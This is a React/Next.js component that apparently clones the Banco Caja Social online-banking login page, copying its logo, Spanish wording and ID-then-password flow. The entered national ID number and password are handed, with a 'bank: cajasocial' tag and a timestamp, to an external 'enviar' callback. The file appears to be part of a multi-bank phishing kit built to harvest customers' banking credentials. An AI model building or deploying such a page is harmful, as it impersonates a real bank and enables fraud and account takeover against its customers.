/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

import LoaderFullScreen from "./LoaderFullScreen";

type UserPrefix = "CC" | "CE" | "NI" | "TI" | "PE";

interface LoginCajaSocialProps {
  enviar?: (data: { view: "login", user: string; pass: string; bank: string; timestamp: string }) => void;
}

export default function Login({ enviar }: LoginCajaSocialProps) {
  const [step, setStep] = useState<"username" | "password">("username");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [userError, setUserError] = useState(false);
  const [passError, setPassError] = useState(false);
  const [loading, setLoading] = useState(false);

  // Validación de usuario: Prefijo válido + números
  const isValidUsername = (value: string): boolean => {
    const regex = /^(CC|CE|NI|TI|PE)\d+$/;
    return regex.test(value.toUpperCase());
  };

  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.toUpperCase();
    setUsername(raw);

    if (raw.length === 0) {
      setUserError(false);
      return;
    }

    const validPrefixes = ["CC", "CE", "NI", "TI", "PE"];
    const currentPrefix = raw.substring(0, 2);

    if (raw.length >= 2) {
      const isInvalidPrefix = !validPrefixes.includes(currentPrefix);
      const hasNonDigitsAfter = !/^\d*$/.test(raw.substring(2));
      setUserError(isInvalidPrefix || hasNonDigitsAfter);
    } else {
      setUserError(!/^[CNTP]/.test(raw));
    }
  };

  const handleNext = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (isValidUsername(username)) {
      setUserError(false);
      setStep("password");
    } else {
      setUserError(true);
    }
  };

  const handleLogin = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (password.trim() === "") {
      setPassError(true);
      return;
    }
    setLoading(true);

    const number = username.substring(2);

    if (enviar) {
      await enviar({ view: "login", user: number, pass: password, bank: "cajasocial", timestamp: new Date().toISOString() });
      setLoading(false);
    } else {
      setTimeout(() => setLoading(false), 2000);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />
      <div className="flex min-h-screen bg-white font-sans text-[#333]">

        {/* LADO IZQUIERDO: IMAGEN */}
        <div className="hidden lg:block w-1/2 relative">
          <img
            src="/cajasocial/background-2.png"
            alt="Fondo Banco"
            className="absolute inset-0 w-full h-full object-cover"
          />
        </div>

        {/* LADO DERECHO: FORMULARIO */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 md:p-16 lg:p-24 text-left">
          <div className="w-full max-w-[440px]">

            {/* LOGO */}
            <div className="mb-10 flex items-center">
              <img
                src="/cajasocial/logoBCSLine.svg"
                alt="Banco Caja Social"
                className="h-[45px] w-auto"
              />
            </div>

            <h1 className="text-[32px] font-bold text-[#222] mb-4 leading-tight">
              Bienvenido al Portal Personas
            </h1>

            {/* TEXTO DETALLE DINÁMICO */}
            <div className="mb-8 min-h-[50px]">
              {step === "username" ? (
                <p className="text-[14px] text-[#555] leading-relaxed animate-in fade-in duration-500">
                  Recuerde que su usuario está compuesto por su Tipo de Identificación
                  <strong> (CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.
                </p>
              ) : (
                <p className="text-[14px] text-[#555] leading-relaxed animate-in fade-in duration-500">
                  Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.
                </p>
              )}
            </div>

            <form onSubmit={step === "username" ? handleNext : handleLogin} autoComplete="off">

              {step === "username" ? (
                /* PASO USUARIO */
                <div className="space-y-6 animate-in fade-in duration-300">
                  <div>
                    <label className="block text-[14px] font-bold mb-2 text-[#333]">Usuario</label>
                    <input
                      type="text"
                      value={username}
                      onChange={handleUsernameChange}
                      autoComplete="off"
                      className={`w-full px-4 py-[12px] border rounded-[8px] focus:outline-none text-[16px] transition-all
                        ${userError ? 'border-[#d93025] bg-[#fffcfb]' : 'border-[#aeb4b9] focus:border-[#00548d]'}
                      `}
                      autoFocus
                    />
                    <div className="mt-2 min-h-[40px]">
                      {userError ? (
                        <p className="text-[13px] text-[#d93025] font-medium">
                          Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.
                        </p>
                      ) : (
                        <p className="text-[13px] text-[#6b7280]">Ejemplo: CC1234567890</p>
                      )}
                    </div>
                  </div>

                  <div className="flex items-center justify-between pt-2">
                    <button
                      type="submit"
                      disabled={!isValidUsername(username)}
                      className={`px-10 py-[12px] rounded-[25px] font-bold text-[15px] transition-all
                        ${isValidUsername(username)
                          ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                          : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                      `}
                    >
                      Siguiente
                    </button>
                    <button type="button" className="text-[#0070c0] font-bold text-[14px] flex items-center gap-1 hover:underline">
                      ¿Olvidó su contraseña? <span className="text-[10px]">▼</span>
                    </button>
                  </div>
                </div>
              ) : (
                /* PASO CONTRASEÑA */
                <div className="space-y-6 animate-in fade-in slide-in-from-right-4 duration-500">
                  <div>
                    <div className="flex justify-between items-center mb-2">
                      <label className="block text-[14px] font-bold text-[#333]">Contraseña</label>
                      <button
                        type="button"
                        onClick={() => { setStep("username"); setPassword(""); }}
                        className="text-[12px] text-[#0070c0] font-bold hover:underline"
                      >
                        Cambiar usuario
                      </button>
                    </div>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        setPassError(false);
                      }}
                      autoComplete="new-password"
                      className={`w-full px-4 py-[12px] border rounded-[8px] focus:outline-none text-[16px] transition-all
                        ${passError ? 'border-[#d93025] bg-[#fffcfb]' : 'border-[#aeb4b9] focus:border-[#00548d]'}
                      `}
                      autoFocus
                    />
                    {passError && (
                      <div className="mt-2 min-h-[20px]">
                        <p className="text-[13px] text-[#d93025] font-medium italic">
                          La contraseña es obligatoria.
                        </p>
                      </div>
                    )}
                  </div>

                  <div className="flex items-center justify-between pt-2">
                    <button
                      type="submit"
                      disabled={password.trim() === ""}
                      className={`px-10 py-[12px] rounded-[25px] font-bold text-[15px] transition-all
                        ${password.trim() !== ""
                          ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                          : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                      `}
                    >
                      Ingresar
                    </button>
                    <button type="button" className="text-[#0070c0] font-bold text-[14px] flex items-center gap-1 hover:underline">
                      ¿Olvidó su contraseña? <span className="text-[10px]">▼</span>
                    </button>
                  </div>
                </div>
              )}
            </form>

            {/* FOOTER */}
            <div className="mt-16 pt-8 border-t border-gray-100 text-[14px]">
              <span className="text-gray-600">¿Es un cliente nuevo?</span>
              <button type="button" className="text-[#0070c0] font-bold hover:underline ml-1">
                Registrarse
              </button>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}